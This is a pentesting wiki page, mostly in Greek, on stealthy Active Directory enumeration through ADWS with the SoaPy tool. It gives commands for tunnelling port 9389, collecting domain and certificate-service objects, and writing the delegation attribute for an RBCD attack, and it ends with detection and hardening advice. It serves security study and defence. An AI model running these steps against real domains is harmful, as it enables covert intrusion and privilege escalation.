# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Τι είναι το ADWS;

Οι Υπηρεσίες Ιστού Active Directory (ADWS) είναι **ενεργοποιημένες από προεπιλογή σε κάθε Domain Controller από το Windows Server 2008 R2** και ακούνε σε TCP **9389**. Παρά το όνομα, **δεν εμπλέκεται HTTP**. Αντίθετα, η υπηρεσία εκθέτει δεδομένα τύπου LDAP μέσω μιας στοίβας ιδιόκτητων πρωτοκόλλων πλαισίωσης .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Δεδομένου ότι η κίνηση είναι ενσωματωμένη μέσα σε αυτά τα δυαδικά πλαίσια SOAP και ταξιδεύει μέσω μιας ασυνήθιστης θύρας, **η αρίθμηση μέσω ADWS είναι πολύ λιγότερο πιθανό να ελεγχθεί, φιλτραριστεί ή υπογραφεί από την κλασική κίνηση LDAP/389 & 636**. Για τους χειριστές αυτό σημαίνει:

* Πιο διακριτική αναγνώριση – Οι ομάδες Blue συχνά επικεντρώνονται σε ερωτήματα LDAP.
* Ελευθερία συλλογής από **μη Windows hosts (Linux, macOS)** μέσω tunneling 9389/TCP μέσω ενός SOCKS proxy.
* Τα ίδια δεδομένα που θα αποκτούσατε μέσω LDAP (χρήστες, ομάδες, ACLs, σχήμα κ.λπ.) και η δυνατότητα εκτέλεσης **εγγραφών** (π.χ. `msDs-AllowedToActOnBehalfOfOtherIdentity` για **RBCD**).

> ΣΗΜΕΙΩΣΗ: Το ADWS χρησιμοποιείται επίσης από πολλά εργαλεία RSAT GUI/PowerShell, οπότε η κίνηση μπορεί να συγχωνευθεί με νόμιμες δραστηριότητες διαχειριστή.

## SoaPy – Εγγενής Πελάτης Python

[SoaPy](https://github.com/logangoins/soapy) είναι μια **πλήρης επαναφορά της στοίβας πρωτοκόλλου ADWS σε καθαρή Python**. Δημιουργεί τα πλαίσια NBFX/NBFSE/NNS/NMF byte-for-byte, επιτρέποντας τη συλλογή από συστήματα τύπου Unix χωρίς να αγγίξει το .NET runtime.

### Κύρια Χαρακτηριστικά

* Υποστηρίζει **proxying μέσω SOCKS** (χρήσιμο από C2 implants).
* Λεπτομερείς φίλτρα αναζήτησης ταυτόσημα με LDAP `-q '(objectClass=user)'`.
* Προαιρετικές **εγγραφές** ( `--set` / `--delete` ).
* **Λειτουργία εξόδου BOFHound** για άμεση εισαγωγή στο BloodHound.
* Σημαία `--parse` για να ομορφύνει τα timestamps / `userAccountControl` όταν απαιτείται ανθρώπινη αναγνωσιμότητα.

### Εγκατάσταση (host χειριστή)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

Η παρακάτω ροή εργασίας δείχνει πώς να καταγράψετε **domain & ADCS objects** μέσω ADWS, να τα μετατρέψετε σε BloodHound JSON και να αναζητήσετε διαδρομές επιθέσεων με βάση πιστοποιητικά – όλα από Linux:

1. **Tunnel 9389/TCP** από το δίκτυο στόχο στο μηχάνημά σας (π.χ. μέσω Chisel, Meterpreter, SSH dynamic port-forward, κ.λπ.). Εξάγετε `export HTTPS_PROXY=socks5://127.0.0.1:1080` ή χρησιμοποιήστε το `--proxyHost/--proxyPort` του SoaPy.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Συλλογή αντικειμένων σχετικών με ADCS από το Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Μετατροπή σε BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Ανεβάστε το ZIP** στο BloodHound GUI και εκτελέστε ερωτήματα cypher όπως `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` για να αποκαλύψετε διαδρομές κλιμάκωσης πιστοποιητικών (ESC1, ESC8, κ.λπ.).

### Γράφοντας `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Συνδυάστε αυτό με `s4u2proxy`/`Rubeus /getticket` για μια πλήρη **Resource-Based Constrained Delegation** αλυσίδα.

## Ανίχνευση & Σκληροποίηση

### Λεπτομερής Καταγραφή ADDS

Ενεργοποιήστε τα παρακάτω κλειδιά μητρώου στους Domain Controllers για να αναδείξετε δαπανηρές / αναποτελεσματικές αναζητήσεις που προέρχονται από ADWS (και LDAP):
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Τα γεγονότα θα εμφανίζονται κάτω από **Directory-Service** με το πλήρες φίλτρο LDAP, ακόμη και όταν το ερώτημα έφτασε μέσω ADWS.

### SACL Canary Objects

1. Δημιουργήστε ένα ψεύτικο αντικείμενο (π.χ. απενεργοποιημένος χρήστης `CanaryUser`).
2. Προσθέστε μια **Audit** ACE για τον _Everyone_ κύριο, που ελέγχεται στο **ReadProperty**.
3. Όποτε ένας επιτιθέμενος εκτελεί `(servicePrincipalName=*)`, `(objectClass=user)` κ.λπ., ο DC εκπέμπει **Event 4662** που περιέχει το πραγματικό SID του χρήστη – ακόμη και όταν το αίτημα είναι προξενευμένο ή προέρχεται από το ADWS.

Παράδειγμα προεγκατεστημένου κανόνα Elastic:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Περίληψη Εργαλείων

| Σκοπός | Εργαλείο | Σημειώσεις |
|--------|----------|------------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Μετατρέπει τα logs του SoaPy/ldapsearch |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Μπορεί να προξενηθεί μέσω του ίδιου SOCKS |

## Αναφορές

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
